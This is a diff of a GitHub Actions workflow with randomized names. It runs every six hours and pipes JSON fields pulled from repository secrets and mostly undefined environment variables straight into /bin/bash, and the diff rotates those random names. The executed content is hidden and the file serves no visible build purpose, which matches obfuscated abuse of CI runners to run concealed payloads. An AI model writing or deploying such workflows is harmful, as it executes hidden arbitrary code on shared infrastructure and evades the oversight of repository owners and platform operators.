@@ -1,30 +1,26 @@
 name: retractionincreased
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 1/6 * * *'
+    - cron: '17 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: retractionincreased
         env:
-          uva43: ${{ secrets.uva43 }}
+          enqwd54285: ${{ secrets.enqwd54285 }}
         run: |
-          echo $uva43 | jq -r .fix3210 | /bin/bash
-          echo $onm935 | jq -r .hh48 | /bin/bash
-          echo $uurnf60 | jq -r .uos2 | /bin/bash
-          echo $x05624 | jq -r .uous34 | /bin/bash
-          echo $u31 | jq -r .j2032 | /bin/bash
-          echo $vdjlw0 | jq -r .xb79724 | /bin/bash
-          echo $h22 | jq -r .qofb7373 | /bin/bash
-          echo $j159 | jq -r .xd35908 | /bin/bash
-          echo $fp0 | jq -r .cwtuf641 | /bin/bash
-          echo $nhwf440 | jq -r .qkbj468 | /bin/bash
-          echo $rv76 | jq -r .iurw3 | /bin/bash
-          echo $xix66219 | jq -r .g29 | /bin/bash
-          echo $ox9 | jq -r .weks54 | /bin/bash
+          echo $enqwd54285 | jq -r .ulv974 | /bin/bash
+          echo $zy8995 | jq -r .jsfl932 | /bin/bash
+          echo $bouo42027 | jq -r .xzsg317 | /bin/bash
+          echo $jatwk2774 | jq -r .j23 | /bin/bash
+          echo $ael3808 | jq -r .q16096 | /bin/bash
+          echo $kpexu659 | jq -r .nsdir16 | /bin/bash
+          echo $zicuc0 | jq -r .ohzw6 | /bin/bash
+          echo $cnnp36442 | jq -r .a49 | /bin/bash
+          echo $uhxxp9541 | jq -r .rgsg317 | /bin/bash
+          echo $vagq073 | jq -r .cvdfb01 | /bin/bash
 
